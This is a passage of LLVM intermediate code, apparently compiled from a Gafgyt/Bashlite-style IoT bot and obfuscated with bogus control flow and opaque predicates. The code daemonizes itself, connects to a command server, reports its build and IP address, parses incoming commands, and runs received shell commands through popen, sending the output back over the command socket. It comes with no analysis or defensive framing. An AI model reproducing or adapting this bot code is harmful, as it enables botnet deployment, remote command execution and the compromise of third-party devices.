  %743 = call i64 @strlen(i8* %742) #10
  %744 = sub i64 %743, 1
  %745 = getelementptr inbounds i8, i8* %741, i64 %744
  %746 = load i8, i8* %745, align 1
  %747 = zext i8 %746 to i32
  %748 = icmp eq i32 %747, 13
  br label %749

; <label>:749:                                    ; preds = %740, %731
  %750 = phi i1 [ true, %731 ], [ %748, %740 ]
  br i1 %750, label %751, label %757

; <label>:751:                                    ; preds = %749
  %752 = load i8*, i8** %26, align 8
  %753 = load i8*, i8** %26, align 8
  %754 = call i64 @strlen(i8* %753) #10
  %755 = sub i64 %754, 1
  %756 = getelementptr inbounds i8, i8* %752, i64 %755
  store i8 0, i8* %756, align 1
  br label %731

; <label>:757:                                    ; preds = %749
  %758 = load i8*, i8** %26, align 8
  store i8* %758, i8** %28, align 8
  br label %759

; <label>:759:                                    ; preds = %787, %757
  %760 = load i32, i32* @x.131
  %761 = load i32, i32* @y.132
  %762 = sub i32 %760, 1
  %763 = mul i32 %760, %762
  %764 = urem i32 %763, 2
  %765 = icmp eq i32 %764, 0
  %766 = icmp slt i32 %761, 10
  %767 = or i1 %765, %766
  br i1 %767, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %759
  %768 = load i8*, i8** %26, align 8
  %769 = load i8, i8* %768, align 1
  %770 = zext i8 %769 to i32
  %771 = icmp ne i32 %770, 32
  %772 = load i32, i32* @x.131
  %773 = load i32, i32* @y.132
  %774 = sub i32 %772, 1
  %775 = mul i32 %772, %774
  %776 = urem i32 %775, 2
  %777 = icmp eq i32 %776, 0
  %778 = icmp slt i32 %773, 10
  %779 = or i1 %777, %778
  br i1 %779, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br i1 %771, label %780, label %785

; <label>:780:                                    ; preds = %originalBBpart2122
  %781 = load i8*, i8** %26, align 8
  %782 = load i8, i8* %781, align 1
  %783 = zext i8 %782 to i32
  %784 = icmp ne i32 %783, 0
  br label %785

; <label>:785:                                    ; preds = %780, %originalBBpart2122
  %786 = phi i1 [ false, %originalBBpart2122 ], [ %784, %780 ]
  br i1 %786, label %787, label %790

; <label>:787:                                    ; preds = %785
  %788 = load i8*, i8** %26, align 8
  %789 = getelementptr inbounds i8, i8* %788, i32 1
  store i8* %789, i8** %26, align 8
  br label %759

; <label>:790:                                    ; preds = %785
  %791 = load i32, i32* @x.131
  %792 = load i32, i32* @y.132
  %793 = sub i32 %791, 1
  %794 = mul i32 %791, %793
  %795 = urem i32 %794, 2
  %796 = icmp eq i32 %795, 0
  %797 = icmp slt i32 %792, 10
  %798 = or i1 %796, %797
  br i1 %798, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %790
  %799 = load i8*, i8** %26, align 8
  store i8 0, i8* %799, align 1
  %800 = load i8*, i8** %26, align 8
  %801 = getelementptr inbounds i8, i8* %800, i32 1
  store i8* %801, i8** %26, align 8
  %802 = load i8*, i8** %28, align 8
  store i8* %802, i8** %29, align 8
  %803 = load i32, i32* @x.131
  %804 = load i32, i32* @y.132
  %805 = sub i32 %803, 1
  %806 = mul i32 %803, %805
  %807 = urem i32 %806, 2
  %808 = icmp eq i32 %807, 0
  %809 = icmp slt i32 %804, 10
  %810 = or i1 %808, %809
  br i1 %810, label %originalBBpart2126, label %originalBB124alteredBB

originalBBpart2126:                               ; preds = %originalBB124
  br label %811

; <label>:811:                                    ; preds = %815, %originalBBpart2126
  %812 = load i8*, i8** %29, align 8
  %813 = load i8, i8* %812, align 1
  %814 = icmp ne i8 %813, 0
  br i1 %814, label %815, label %824

; <label>:815:                                    ; preds = %811
  %816 = load i8*, i8** %29, align 8
  %817 = load i8, i8* %816, align 1
  %818 = zext i8 %817 to i32
  %819 = call i32 @toupper(i32 %818) #10
  %820 = trunc i32 %819 to i8
  %821 = load i8*, i8** %29, align 8
  store i8 %820, i8* %821, align 1
  %822 = load i8*, i8** %29, align 8
  %823 = getelementptr inbounds i8, i8* %822, i32 1
  store i8* %823, i8** %29, align 8
  br label %811

; <label>:824:                                    ; preds = %811
  %825 = load i8*, i8** %28, align 8
  %826 = call i32 @strcmp(i8* %825, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.489, i32 0, i32 0)) #10
  %827 = icmp eq i32 %826, 0
  br i1 %827, label %828, label %902

; <label>:828:                                    ; preds = %824
  %829 = load i32, i32* @x.131
  %830 = load i32, i32* @y.132
  %831 = sub i32 %829, 1
  %832 = mul i32 %829, %831
  %833 = urem i32 %832, 2
  %834 = icmp eq i32 %833, 0
  %835 = icmp slt i32 %830, 10
  %836 = or i1 %834, %835
  br i1 %836, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %828
  %837 = call i32 @listFork()
  %838 = icmp ne i32 %837, 0
  %839 = load i32, i32* @x.131
  %840 = load i32, i32* @y.132
  %841 = sub i32 %839, 1
  %842 = mul i32 %839, %841
  %843 = urem i32 %842, 2
  %844 = icmp eq i32 %843, 0
  %845 = icmp slt i32 %840, 10
  %846 = or i1 %844, %845
  br i1 %846, label %originalBBpart2130, label %originalBB128alteredBB

originalBBpart2130:                               ; preds = %originalBB128
  br i1 %838, label %847, label %864

; <label>:847:                                    ; preds = %originalBBpart2130
  %848 = load i32, i32* @x.131
  %849 = load i32, i32* @y.132
  %850 = sub i32 %848, 1
  %851 = mul i32 %848, %850
  %852 = urem i32 %851, 2
  %853 = icmp eq i32 %852, 0
  %854 = icmp slt i32 %849, 10
  %855 = or i1 %853, %854
  br i1 %855, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %847
  %856 = load i32, i32* @x.131
  %857 = load i32, i32* @y.132
  %858 = sub i32 %856, 1
  %859 = mul i32 %856, %858
  %860 = urem i32 %859, 2
  %861 = icmp eq i32 %860, 0
  %862 = icmp slt i32 %857, 10
  %863 = or i1 %861, %862
  br i1 %863, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br label %477

; <label>:864:                                    ; preds = %originalBBpart2130
  %865 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %865, i8 0, i64 1024, i32 16, i1 false)
  %866 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %867 = load i8*, i8** %26, align 8
  %868 = call i32 (i8*, i8*, ...) @szprintf(i8* %866, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.490, i32 0, i32 0), i8* %867)
  %869 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %870 = call i32 @fdpopen(i8* %869, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store i32 %870, i32* %31, align 4
  br label %871

; <label>:871:                                    ; preds = %originalBBpart2138, %864
  %872 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %873 = load i32, i32* %31, align 4
  %874 = call i8* @fdgets(i8* %872, i32 1024, i32 %873)
  %875 = icmp ne i8* %874, null
  br i1 %875, label %876, label %899

; <label>:876:                                    ; preds = %871
  %877 = load i32, i32* @x.131
  %878 = load i32, i32* @y.132
  %879 = sub i32 %877, 1
  %880 = mul i32 %877, %879
  %881 = urem i32 %880, 2
  %882 = icmp eq i32 %881, 0
  %883 = icmp slt i32 %878, 10
  %884 = or i1 %882, %883
  br i1 %884, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %876
  %885 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  call void @trim(i8* %885)
  %886 = load i32, i32* @mainCommSock, align 4
  %887 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %888 = call i32 (i32, i8*, ...) @sockprintf(i32 %886, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.491, i32 0, i32 0), i8* %887)
  %889 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %889, i8 0, i64 1024, i32 16, i1 false)
  %890 = call i32 @sleep(i32 1)
  %891 = load i32, i32* @x.131
  %892 = load i32, i32* @y.132
  %893 = sub i32 %891, 1
  %894 = mul i32 %891, %893
  %895 = urem i32 %894, 2
  %896 = icmp eq i32 %895, 0
  %897 = icmp slt i32 %892, 10
  %898 = or i1 %896, %897
  br i1 %898, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  br label %871

; <label>:899:                                    ; preds = %871
  %900 = load i32, i32* %31, align 4
  %901 = call i32 @fdpclose(i32 %900)
  call void @exit(i32 0) #14
  unreachable

; <label>:902:                                    ; preds = %824
  store i32 1, i32* %33, align 4
  %903 = load i8*, i8** %26, align 8
  %904 = call i8* @strtok(i8* %903, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #2
  store i8* %904, i8** %34, align 8
  %905 = load i8*, i8** %28, align 8
  %906 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 0
  store i8* %905, i8** %906, align 16
  br label %907

; <label>:907:                                    ; preds = %originalBBpart2146, %902
  %908 = load i8*, i8** %34, align 8
  %909 = icmp ne i8* %908, null
  br i1 %909, label %910, label %972

; <label>:910:                                    ; preds = %907
  %911 = load i32, i32* @x.131
  %912 = load i32, i32* @y.132
  %913 = sub i32 %911, 1
  %914 = mul i32 %911, %913
  %915 = urem i32 %914, 2
  %916 = icmp eq i32 %915, 0
  %917 = icmp slt i32 %912, 10
  %918 = or i1 %916, %917
  br i1 %918, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %910
  %919 = load i8*, i8** %34, align 8
  %920 = load i8, i8* %919, align 1
  %921 = zext i8 %920 to i32
  %922 = icmp ne i32 %921, 10
  %923 = load i32, i32* @x.131
  %924 = load i32, i32* @y.132
  %925 = sub i32 %923, 1
  %926 = mul i32 %923, %925
  %927 = urem i32 %926, 2
  %928 = icmp eq i32 %927, 0
  %929 = icmp slt i32 %924, 10
  %930 = or i1 %928, %929
  br i1 %930, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br i1 %922, label %931, label %954

; <label>:931:                                    ; preds = %originalBBpart2142
  %932 = load i8*, i8** %34, align 8
  %933 = call i64 @strlen(i8* %932) #10
  %934 = add i64 %933, 1
  %935 = call noalias i8* @malloc(i64 %934) #2
  %936 = load i32, i32* %33, align 4
  %937 = sext i32 %936 to i64
  %938 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %937
  store i8* %935, i8** %938, align 8
  %939 = load i32, i32* %33, align 4
  %940 = sext i32 %939 to i64
  %941 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %940
  %942 = load i8*, i8** %941, align 8
  %943 = load i8*, i8** %34, align 8
  %944 = call i64 @strlen(i8* %943) #10
  %945 = add i64 %944, 1
  call void @llvm.memset.p0i8.i64(i8* %942, i8 0, i64 %945, i32 1, i1 false)
  %946 = load i32, i32* %33, align 4
  %947 = sext i32 %946 to i64
  %948 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %947
  %949 = load i8*, i8** %948, align 8
  %950 = load i8*, i8** %34, align 8
  %951 = call i8* @strcpy(i8* %949, i8* %950) #2
  %952 = load i32, i32* %33, align 4
  %953 = add nsw i32 %952, 1
  store i32 %953, i32* %33, align 4
  br label %954

; <label>:954:                                    ; preds = %931, %originalBBpart2142
  %955 = load i32, i32* @x.131
  %956 = load i32, i32* @y.132
  %957 = sub i32 %955, 1
  %958 = mul i32 %955, %957
  %959 = urem i32 %958, 2
  %960 = icmp eq i32 %959, 0
  %961 = icmp slt i32 %956, 10
  %962 = or i1 %960, %961
  br i1 %962, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %954
  %963 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #2
  store i8* %963, i8** %34, align 8
  %964 = load i32, i32* @x.131
  %965 = load i32, i32* @y.132
  %966 = sub i32 %964, 1
  %967 = mul i32 %964, %966
  %968 = urem i32 %967, 2
  %969 = icmp eq i32 %968, 0
  %970 = icmp slt i32 %965, 10
  %971 = or i1 %969, %970
  br i1 %971, label %originalBBpart2146, label %originalBB144alteredBB

originalBBpart2146:                               ; preds = %originalBB144
  br label %907

; <label>:972:                                    ; preds = %907
  %973 = load i32, i32* @x.131
  %974 = load i32, i32* @y.132
  %975 = sub i32 %973, 1
  %976 = mul i32 %973, %975
  %977 = urem i32 %976, 2
  %978 = icmp eq i32 %977, 0
  %979 = icmp slt i32 %974, 10
  %980 = or i1 %978, %979
  br i1 %980, label %originalBB148, label %originalBB148alteredBB

originalBB148:                                    ; preds = %originalBB148alteredBB, %972
  %981 = load i32, i32* %33, align 4
  %982 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i32 0, i32 0
  call void @processCmd(i32 %981, i8** %982)
  %983 = load i32, i32* %33, align 4
  %984 = icmp sgt i32 %983, 1
  %985 = load i32, i32* @x.131
  %986 = load i32, i32* @y.132
  %987 = sub i32 %985, 1
  %988 = mul i32 %985, %987
  %989 = urem i32 %988, 2
  %990 = icmp eq i32 %989, 0
  %991 = icmp slt i32 %986, 10
  %992 = or i1 %990, %991
  br i1 %992, label %originalBBpart2150, label %originalBB148alteredBB

originalBBpart2150:                               ; preds = %originalBB148
  br i1 %984, label %993, label %1023

; <label>:993:                                    ; preds = %originalBBpart2150
  %994 = load i32, i32* @x.131
  %995 = load i32, i32* @y.132
  %996 = sub i32 %994, 1
  %997 = mul i32 %994, %996
  %998 = urem i32 %997, 2
  %999 = icmp eq i32 %998, 0
  %1000 = icmp slt i32 %995, 10
  %1001 = or i1 %999, %1000
  br i1 %1001, label %originalBB152, label %originalBB152alteredBB

originalBB152:                                    ; preds = %originalBB152alteredBB, %993
  store i32 1, i32* %35, align 4
  store i32 1, i32* %35, align 4
  %1002 = load i32, i32* @x.131
  %1003 = load i32, i32* @y.132
  %1004 = sub i32 %1002, 1
  %1005 = mul i32 %1002, %1004
  %1006 = urem i32 %1005, 2
  %1007 = icmp eq i32 %1006, 0
  %1008 = icmp slt i32 %1003, 10
  %1009 = or i1 %1007, %1008
  br i1 %1009, label %originalBBpart2154, label %originalBB152alteredBB

originalBBpart2154:                               ; preds = %originalBB152
  br label %1010

; <label>:1010:                                   ; preds = %1019, %originalBBpart2154
  %1011 = load i32, i32* %35, align 4
  %1012 = load i32, i32* %33, align 4
  %1013 = icmp slt i32 %1011, %1012
  br i1 %1013, label %1014, label %1022

; <label>:1014:                                   ; preds = %1010
  %1015 = load i32, i32* %35, align 4
  %1016 = sext i32 %1015 to i64
  %1017 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i64 0, i64 %1016
  %1018 = load i8*, i8** %1017, align 8
  call void @free(i8* %1018) #2
  br label %1019

; <label>:1019:                                   ; preds = %1014
  %1020 = load i32, i32* %35, align 4
  %1021 = add nsw i32 %1020, 1
  store i32 %1021, i32* %35, align 4
  br label %1010

; <label>:1022:                                   ; preds = %1010
  br label %1023

; <label>:1023:                                   ; preds = %1022, %originalBBpart2150
  %1024 = load i32, i32* @x.131
  %1025 = load i32, i32* @y.132
  %1026 = sub i32 %1024, 1
  %1027 = mul i32 %1024, %1026
  %1028 = urem i32 %1027, 2
  %1029 = icmp eq i32 %1028, 0
  %1030 = icmp slt i32 %1025, 10
  %1031 = or i1 %1029, %1030
  br i1 %1031, label %originalBB156, label %originalBB156alteredBB

originalBB156:                                    ; preds = %originalBB156alteredBB, %1023
  %1032 = load i32, i32* @x.131
  %1033 = load i32, i32* @y.132
  %1034 = sub i32 %1032, 1
  %1035 = mul i32 %1032, %1034
  %1036 = urem i32 %1035, 2
  %1037 = icmp eq i32 %1036, 0
  %1038 = icmp slt i32 %1033, 10
  %1039 = or i1 %1037, %1038
  br i1 %1039, label %originalBBpart2158, label %originalBB156alteredBB

originalBBpart2158:                               ; preds = %originalBB156
  br label %1040

; <label>:1040:                                   ; preds = %originalBBpart2158, %660
  br label %477

; <label>:1041:                                   ; preds = %originalBBpart2110, %477
  %1042 = load i32, i32* @x.131
  %1043 = load i32, i32* @y.132
  %1044 = sub i32 %1042, 1
  %1045 = mul i32 %1042, %1044
  %1046 = urem i32 %1045, 2
  %1047 = icmp eq i32 %1046, 0
  %1048 = icmp slt i32 %1043, 10
  %1049 = or i1 %1047, %1048
  br i1 %1049, label %originalBB160, label %originalBB160alteredBB

originalBB160:                                    ; preds = %originalBB160alteredBB, %1041
  %1050 = load i32, i32* @x.131
  %1051 = load i32, i32* @y.132
  %1052 = sub i32 %1050, 1
  %1053 = mul i32 %1050, %1052
  %1054 = urem i32 %1053, 2
  %1055 = icmp eq i32 %1054, 0
  %1056 = icmp slt i32 %1051, 10
  %1057 = or i1 %1055, %1056
  br i1 %1057, label %originalBBpart2162, label %originalBB160alteredBB

originalBBpart2162:                               ; preds = %originalBB160
  br label %418
                                                  ; No predecessors!
  %1059 = load i32, i32* %3, align 4
  ret i32 %1059

originalBBalteredBB:                              ; preds = %originalBB, %41
  call void @exit(i32 1) #14
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %116
  %1060 = load i8**, i8*** %5, align 8
  %1061 = getelementptr inbounds i8*, i8** %1060, i64 0
  %1062 = load i8*, i8** %1061, align 8
  %1063 = load i32, i32* %18, align 4
  %1064 = sext i32 %1063 to i64
  %1065 = getelementptr inbounds i8, i8* %1062, i64 %1064
  %1066 = load i8, i8* %1065, align 1
  %1067 = sext i8 %1066 to i32
  %1068 = icmp ne i32 %1067, 47
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %142
  %1069 = load i32, i32* %18, align 4
  %_ = shl i32 %1069, -1
  %_7 = shl i32 %1069, -1
  %_8 = sub i32 %1069, -1
  %gen = mul i32 %_8, -1
  %_9 = sub i32 %1069, -1
  %gen10 = mul i32 %_9, -1
  %_11 = sub i32 %1069, -1
  %gen12 = mul i32 %_11, -1
  %_13 = sub i32 0, %1069
  %gen14 = add i32 %_13, -1
  %_15 = shl i32 %1069, -1
  %_16 = sub i32 0, %1069
  %gen17 = add i32 %_16, -1
  %1070 = add nsw i32 %1069, -1
  store i32 %1070, i32* %18, align 4
  br label %originalBB6

originalBB21alteredBB:                            ; preds = %originalBB21, %171
  %1071 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %1072 = call i32 @feof(%struct._IO_FILE* %1071) #2
  %1073 = icmp ne i32 %1072, 0
  %_22 = sub i1 false, %1073
  %gen23 = add i1 %_22, true
  %_24 = sub i1 %1073, true
  %gen25 = mul i1 %_24, true
  %1074 = xor i1 %1073, true
  br label %originalBB21

originalBB29alteredBB:                            ; preds = %originalBB29, %200
  %1075 = load i32, i32* %19, align 4
  %1076 = add nsw i32 %1075, 1
  store i32 %1076, i32* %19, align 4
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %220
  %1077 = load i32, i32* %19, align 4
  %1078 = icmp eq i32 %1077, 0
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %239
  %1079 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %1080 = call i32 @fclose(%struct._IO_FILE* %1079)
  %1081 = load i8*, i8** %14, align 8
  %1082 = call %struct._IO_FILE* @fopen(i8* %1081, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.483, i32 0, i32 0))
  store %struct._IO_FILE* %1082, %struct._IO_FILE** %20, align 8
  %1083 = load %struct._IO_FILE*, %struct._IO_FILE** %20, align 8
  %1084 = icmp ne %struct._IO_FILE* %1083, null
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %268
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %285
  %1085 = load %struct._IO_FILE*, %struct._IO_FILE** %15, align 8
  %1086 = call i32 @fclose(%struct._IO_FILE* %1085)
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %319
  %1087 = call i32 @fork() #2
  store i32 %1087, i32* %10, align 4
  %1088 = icmp ne i32 %1087, 0
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %338
  call void @exit(i32 0) #14
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %355
  %1089 = load i32, i32* %10, align 4
  %1090 = icmp ne i32 %1089, 0
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %381
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %398
  %1091 = call i32 @setsid() #2
  %1092 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.479, i32 0, i32 0)) #2
  %1093 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %418
  %1094 = call i32 @initConnection()
  %1095 = icmp ne i32 %1094, 0
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %437
  %1096 = call i32 @sleep(i32 30)
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %455
  %1097 = load i32, i32* @mainCommSock, align 4
  %1098 = call i8* @getBuild()
  %1099 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %1100 = call i8* @inet_ntoa(i32 %1099) #2
  %1101 = call i32 (i32, i8*, ...) @sockprintf(i32 %1097, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.485, i32 0, i32 0), i8* %1098, i8* %1100)
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %482
  store i32 0, i32* %23, align 4
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %529
  %1102 = load i32, i32* %25, align 4
  %_86 = shl i32 %1102, 1
  %_87 = sub i32 %1102, 1
  %gen88 = mul i32 %_87, 1
  %_89 = sub i32 0, %1102
  %gen90 = add i32 %_89, 1
  %1103 = add i32 %1102, 1
  store i32 %1103, i32* %25, align 4
  br label %originalBB85

originalBB94alteredBB:                            ; preds = %originalBB94, %566
  %1104 = load i32*, i32** @pids, align 8
  %1105 = load i32, i32* %25, align 4
  %1106 = zext i32 %1105 to i64
  %1107 = getelementptr inbounds i32, i32* %1104, i64 %1106
  %1108 = load i32, i32* %1107, align 4
  %1109 = load i32*, i32** %24, align 8
  %1110 = load i32, i32* %25, align 4
  %1111 = zext i32 %1110 to i64
  %1112 = getelementptr inbounds i32, i32* %1109, i64 %1111
  store i32 %1108, i32* %1112, align 4
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %600
  %1113 = load i32, i32* %23, align 4
  %_99 = sub i32 %1113, 1
  %gen100 = mul i32 %_99, 1
  %_101 = sub i32 %1113, 1
  %gen102 = mul i32 %_101, 1
  %_103 = shl i32 %1113, 1
  %_104 = shl i32 %1113, 1
  %1114 = add nsw i32 %1113, 1
  store i32 %1114, i32* %23, align 4
  br label %originalBB98

originalBB108alteredBB:                           ; preds = %originalBB108, %643
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %669
  %1115 = load i8*, i8** %27, align 8
  %1116 = load i8, i8* %1115, align 1
  %1117 = zext i8 %1116 to i32
  %1118 = icmp ne i32 %1117, 32
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %705
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %759
  %1119 = load i8*, i8** %26, align 8
  %1120 = load i8, i8* %1119, align 1
  %1121 = zext i8 %1120 to i32
  %1122 = icmp ne i32 %1121, 32
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %790
  %1123 = load i8*, i8** %26, align 8
  store i8 0, i8* %1123, align 1
  %1124 = load i8*, i8** %26, align 8
  %1125 = getelementptr inbounds i8, i8* %1124, i32 1
  store i8* %1125, i8** %26, align 8
  %1126 = load i8*, i8** %28, align 8
  store i8* %1126, i8** %29, align 8
  br label %originalBB124

originalBB128alteredBB:                           ; preds = %originalBB128, %828
  %1127 = call i32 @listFork()
  %1128 = icmp ne i32 %1127, 0
  br label %originalBB128

originalBB132alteredBB:                           ; preds = %originalBB132, %847
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %876
  %1129 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  call void @trim(i8* %1129)
  %1130 = load i32, i32* @mainCommSock, align 4
  %1131 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  %1132 = call i32 (i32, i8*, ...) @sockprintf(i32 %1130, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.491, i32 0, i32 0), i8* %1131)
  %1133 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1133, i8 0, i64 1024, i32 16, i1 false)
  %1134 = call i32 @sleep(i32 1)
  br label %originalBB136

originalBB140alteredBB:                           ; preds = %originalBB140, %910
  %1135 = load i8*, i8** %34, align 8
  %1136 = load i8, i8* %1135, align 1
  %1137 = zext i8 %1136 to i32
  %1138 = icmp ne i32 %1137, 10
  br label %originalBB140

originalBB144alteredBB:                           ; preds = %originalBB144, %954
  %1139 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.303, i32 0, i32 0)) #2
  store i8* %1139, i8** %34, align 8
  br label %originalBB144

originalBB148alteredBB:                           ; preds = %originalBB148, %972
  %1140 = load i32, i32* %33, align 4
  %1141 = getelementptr inbounds [10 x i8*], [10 x i8*]* %32, i32 0, i32 0
  call void @processCmd(i32 %1140, i8** %1141)
  %1142 = load i32, i32* %33, align 4
  %1143 = icmp sgt i32 %1142, 1
  br label %originalBB148

originalBB152alteredBB:                           ; preds = %originalBB152, %993
  store i32 1, i32* %35, align 4
  store i32 1, i32* %35, align 4
  br label %originalBB152

originalBB156alteredBB:                           ; preds = %originalBB156, %1023
  br label %originalBB156

originalBB160alteredBB:                           ; preds = %originalBB160, %1041
  br label %originalBB160
}

declare i32 @umask(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fputs(i8*, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
